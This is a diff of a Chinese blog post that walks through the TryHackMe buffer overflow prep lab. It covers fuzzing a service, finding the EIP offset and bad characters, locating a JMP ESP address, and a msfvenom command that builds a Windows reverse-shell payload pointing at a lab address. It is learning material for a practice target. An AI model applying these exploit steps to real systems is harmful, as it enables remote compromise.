@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707195035870.png">
 <meta property="og:image" content="https://blog.irec.moe/thm_bufferoverflow/image-20250707225512043.png">
 <meta property="article:published_time" content="2025-07-07T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-07-07T17:38:42.047Z">
+<meta property="article:modified_time" content="2025-07-07T17:54:35.285Z">
 <meta property="article:author" content="Recopec">
 <meta property="article:tag" content="栈">
 <meta name="twitter:card" content="summary">
@@ -34,9 +34,9 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1751909938140">
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1751910940668">
 
-<link rel="stylesheet" href="/css/style.css?v=1751909938140">
+<link rel="stylesheet" href="/css/style.css?v=1751910940668">
 
 
 
@@ -48,7 +48,7 @@
 <script src="/lib/lax.min.js" async></script>
 
 
-<script async src="/js/app.js?v=1751909938140"></script>
+<script async src="/js/app.js?v=1751910940668"></script>
 
  
 
@@ -57,7 +57,8 @@
 <link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
 <!-- hexo injector head_end start -->
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
-<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/bg.jpg)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Recopec"><img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Recopec 的博客" type="application/atom+xml">
+</head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/bg.jpg)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Recopec"><img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
     <div class="nexmoe-avatar mdui-ripple">
         <a href="/" title="Recopec">
             <img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec" alt="Recopec">
@@ -389,16 +390,16 @@
 
     <p>Room：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/bufferoverflowprep">https://tryhackme.com/room/bufferoverflowprep</a></p>
 <p>首先这个房间要有一点点计算机的底层知识，建议开始之前去了解一下。</p>
-<h1>背景知识</h1>
-<h2 id="EIP">EIP</h2>
+<h2 id="背景知识">背景知识</h2>
+<h3 id="EIP">EIP</h3>
 <p>EIP 是 <strong>x86 架构（32 位）CPU 中的一个特殊寄存器</strong>。它非常重要，因为它<strong>存储着 CPU 下一条要执行的指令的内存地址</strong>。</p>
-<h2 id="Immunity-Debugger">Immunity Debugger</h2>
+<h3 id="Immunity-Debugger">Immunity Debugger</h3>
 <p>是调试器，类似 OllyDbg x64dbg / x32dbg 这种软件，分析调试软件用的。</p>
-<h2 id="Mona">Mona</h2>
+<h3 id="Mona">Mona</h3>
 <p><strong>Mona</strong> 是一个功能强大的 <strong>Python 脚本</strong>，专门设计用于扩展和增强 <strong>Immunity Debugger</strong> 或 <strong>WinDbg</strong> 这类调试器的功能。它在**漏洞利用（Exploit Development）<strong>和</strong>逆向工程（Reverse Engineering）<strong>领域非常受欢迎，特别是用于自动化许多在</strong>缓冲区溢出（Buffer Overflow）**漏洞利用过程中繁琐且耗时的任务。</p>
-<h2 id="模式字符串（Pattern-String）">模式字符串（Pattern String）</h2>
+<h3 id="模式字符串（Pattern-String）">模式字符串（Pattern String）</h3>
 <p>是在<strong>缓冲区溢出漏洞利用</strong>中用于<strong>精确计算 EIP（指令指针）偏移量</strong>的一种特殊字符串。它由一系列<strong>唯一且按特定算法生成</strong>的字符或字节组成，其独特性在于字符串中的任何一个固定长度的片段都只会在整个字符串的<strong>唯一一个位置</strong>出现。当你将足够长的模式字符串作为输入发送给易受攻击的程序，并导致其崩溃时，被模式字符串片段覆盖的 EIP 寄存器值就如同一个“指纹”或“线索”。通过工具（如 Metasploit 的 <code>pattern_offset.rb</code> 或 Mona 的 <code>findmsp</code> 命令）反向查找这个“指纹”在原始模式字符串中的位置，你就能<strong>精确地确定从输入起始点到 EIP 的字节偏移量</strong>，从而知道需要填充多少垃圾数据才能精准控制程序执行流。</p>
-<h2 id="字节序（Endianness）">字节序（Endianness）</h2>
+<h3 id="字节序（Endianness）">字节序（Endianness）</h3>
 <p>字节序指的是<strong>多字节数据（例如一个 32 位整数或一个内存地址）在计算机内存中存储的字节顺序</strong>。主要有两种类型：</p>
 <ol>
 <li><strong>大端序 (Big-Endian)</strong>：
@@ -414,7 +415,7 @@
 </ul>
 </li>
 </ol>
-<h2 id="坏字符（Bad-Characters）">坏字符（Bad Characters）</h2>
+<h3 id="坏字符（Bad-Characters）">坏字符（Bad Characters）</h3>
 <p>在缓冲区溢出漏洞利用中，你的目标是将一段特定的字节序列（通常是 Shellcode 和返回地址）写入到程序的内存中。然而，程序在处理输入时，可能会使用一些<strong>字符串操作函数</strong>（例如 C 语言中的 <code>strcpy()</code>、<code>strcat()</code>、<code>sprintf()</code> 等）。</p>
 <p>这些函数有特定的行为：</p>
 <ol>
@@ -428,13 +429,13 @@
 </li>
 </ol>
 <hr>
-<h1>连接机器</h1>
+<h2 id="连接机器">连接机器</h2>
 <p>这里我试了好久，网上关于 <code>xfreerdp3</code> 的教程基本上没有。实际上这个软件体验很差，我最后用 socat 映射 3389 给本机，用 mstsc 。</p>
 <figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:admin</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/p:password</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/cert:ignore</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/sec:rdp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tls:enforce:1.0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:10.10.3.91</span></span></code></pre></div></div></figure>
 <p>打开 <code>Immunity Debugger</code> 执行这个命令，设置 mona 的工作文件夹。</p>
 <figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">!mona config -set workingfolder c:\mona\%p</span></span></code></pre></div></div></figure>
 <p>然后让我们用 nc 连一下服务器，是一个交互程序，好像是让我测试不同的入口会发生什么不一样的错误这样。</p>
-<h1>找崩溃区间</h1>
+<h2 id="找崩溃区间">找崩溃区间</h2>
 <p>生成了一个一直增加发送字符的脚本，步进是 100bytes</p>
 <figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#!/usr/bin/env python3</span></span>
 <span class="line"></span>
@@ -464,7 +465,7 @@
 <span class="line"><span style="color: #ABB2BF">  time.</span><span style="color: #61AFEF">sleep</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>
 <img src="/thm_bufferoverflow/image-20250707160647025.png" class="" title="image-20250707160647025">
 <p>2000bytes 崩溃。</p>
-<h1>崩溃复现和控制 EIP</h1>
+<h2 id="崩溃复现和控制-EIP">崩溃复现和控制 EIP</h2>
 <figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 生成一个超过崩溃阈值 400bytes 的文本</span></span>
 <span class="line"><span style="color: #61AFEF">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-l</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2400</span></span></code></pre></div></div></figure>
 <p>这是让我们找那个崩溃的临界点，加400字节我猜是增加一点容错。替换到代码中的 <code>payload</code> 部分。</p>
@@ -502,7 +503,7 @@
 <p>然后就是测试这个 offset 能用不，脚本中的 offset 设置成上面记下来的值，把之前脚本中的 payload 删掉（nano 编辑器剪切行是 CTRL+K），把 <code>retn</code> 设置成 “ABCD”，这个 “ABCD” 就是<strong>假的 EIP 要执行的地址</strong>，这里我们只是测试一下，看看 EIP 的值会不会变。</p>
 <img src="/thm_bufferoverflow/image-20250707213628033.png" class="" title="image-20250707213628033">
 <p>可以看到 EIP 变成我们想要的了，<code>44 43 42 41</code> 即反转的 <code>ABCD</code>，为什么这样，因为 x86-x64 架构都用的小端序。</p>
-<h1>找坏字符</h1>
+<h2 id="找坏字符">找坏字符</h2>
 <figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 这段代码是生成 bytearray</span></span>
 <span class="line"><span style="color: #7F848E; font-style: italic"># -b 参数是排除掉生成这样的字符</span></span>
 <span class="line"><span style="color: #7F848E; font-style: italic"># 这里排除掉了 \x00 即空字节</span></span>
@@ -551,7 +552,7 @@
 <img src="/thm_bufferoverflow/image-20250707193600660.png" class="" title="image-20250707193600660">
 <p>好，这下一模一样了，没出错。OK，下一步。</p>
 <p>**Tips：**一般一个出错的字符，他后面跟着错那个字符应该是好的。但是也不确定，也有可能是两个都会出错，可以用排除法解决。</p>
-<h1>找合适的跳转地址</h1>
+<h2 id="找合适的跳转地址">找合适的跳转地址</h2>
 <p>为什么要找到这个跳转地址呢，我们之前不是能控制 EIP 了嘛，现在需要一个地址，他的行为是能够跳转到 ESP 那里，这就是 <code>JMP ESP</code>。我们的 shellcode 不是在 ESP 那儿吗，这样做就能保证执行我们的 shellcode。</p>
 <p>为什么不写死地址呢，因为每次执行溢出的时候，我们的代码段可能不会在硬编码的那儿，但是 <code>JMP ESP</code> 能保证每次跳转的都是在那儿，所以能稳定的触发 shellcode。</p>
 <p>让我们找到一个跳板地址，并且这个地址不会被坏字符破坏。</p>
@@ -560,7 +561,7 @@
 <img src="/thm_bufferoverflow/image-20250707194430742.png" class="" title="image-20250707194430742">
 <p>出来这么多，原文让我们随便挑一个，构造好的如下，注意是小端序。</p>
 <figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">retn</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\x</span><span style="color: #98C379">af</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">11</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">50</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">62</span></span></code></pre></div></div></figure>
-<h1>生成马</h1>
+<h2 id="生成马">生成马</h2>
 <figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 用这行命令生成</span></span>
 <span class="line"><span style="color: #7F848E; font-style: italic"># -b 是排除掉坏字符</span></span>
 <span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">EXITFUNC=thread</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00\x07\x08\x2e\x2f\xa0\xa1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">c</span></span></code></pre></div></div></figure>
@@ -569,12 +570,12 @@
 <span class="line"><span style="color: #61AFEF">payload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> (</span><span style="color: #98C379">&quot;你&quot;</span></span>
 <span class="line"><span style="color: #61AFEF">&quot;的&quot;</span></span>
 <span class="line"><span style="color: #61AFEF">&quot;马&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure>
-<h1>准备无操作字节（NOPs）</h1>
+<h2 id="准备无操作字节（NOPs）">准备无操作字节（NOPs）</h2>
 <p>NOPs 的主要作用是为编码后的 Shellcode 提供必要的解包空间和稳定性，这个作用就是字面意思。</p>
 <figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">padding</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x90&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span></span></code></pre></div></div></figure>
 <img src="/thm_bufferoverflow/image-20250707195035870.png" class="" title="image-20250707195035870">
 <p>顺利上线</p>
-<h1>结束</h1>
+<h2 id="结束">结束</h2>
 <p>简单画了个图，便于理解。</p>
 <img src="/thm_bufferoverflow/image-20250707225512043.png" class="" title="image-20250707225512043">
     
@@ -602,7 +603,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1751909938052"></script>
+    <script async src="/js/copy-codeblock.js?v=1751910940586"></script>
   
 
   
@@ -636,7 +637,7 @@
             <button class="mdui-fab catalog" style="overflow:unset;">
                 <i class="nexmoefont icon-i-catalog"></i>
                 <div class="nexmoe-toc">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EIP"><span class="toc-number">1.1.</span> <span class="toc-text">EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Immunity-Debugger"><span class="toc-number">1.2.</span> <span class="toc-text">Immunity Debugger</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mona"><span class="toc-number">1.3.</span> <span class="toc-text">Mona</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88Pattern-String%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">模式字符串（Pattern String）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E5%BA%8F%EF%BC%88Endianness%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">字节序（Endianness）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9D%8F%E5%AD%97%E7%AC%A6%EF%BC%88Bad-Characters%EF%BC%89"><span class="toc-number">1.6.</span> <span class="toc-text">坏字符（Bad Characters）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">连接机器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">找崩溃区间</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">崩溃复现和控制 EIP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">找坏字符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">找合适的跳转地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">生成马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">准备无操作字节（NOPs）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">结束</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EIP"><span class="toc-number">1.1.</span> <span class="toc-text">EIP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Immunity-Debugger"><span class="toc-number">1.2.</span> <span class="toc-text">Immunity Debugger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mona"><span class="toc-number">1.3.</span> <span class="toc-text">Mona</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E5%BC%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88Pattern-String%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">模式字符串（Pattern String）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E5%BA%8F%EF%BC%88Endianness%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">字节序（Endianness）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%8F%E5%AD%97%E7%AC%A6%EF%BC%88Bad-Characters%EF%BC%89"><span class="toc-number">1.6.</span> <span class="toc-text">坏字符（Bad Characters）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%9C%BA%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">连接机器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%B4%A9%E6%BA%83%E5%8C%BA%E9%97%B4"><span class="toc-number">3.</span> <span class="toc-text">找崩溃区间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B4%A9%E6%BA%83%E5%A4%8D%E7%8E%B0%E5%92%8C%E6%8E%A7%E5%88%B6-EIP"><span class="toc-number">4.</span> <span class="toc-text">崩溃复现和控制 EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%9D%8F%E5%AD%97%E7%AC%A6"><span class="toc-number">5.</span> <span class="toc-text">找坏字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%90%88%E9%80%82%E7%9A%84%E8%B7%B3%E8%BD%AC%E5%9C%B0%E5%9D%80"><span class="toc-number">6.</span> <span class="toc-text">找合适的跳转地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E9%A9%AC"><span class="toc-number">7.</span> <span class="toc-text">生成马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E6%97%A0%E6%93%8D%E4%BD%9C%E5%AD%97%E8%8A%82%EF%BC%88NOPs%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">准备无操作字节（NOPs）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-number">9.</span> <span class="toc-text">结束</span></a></li></ol>
                 </div>
             </button>
             
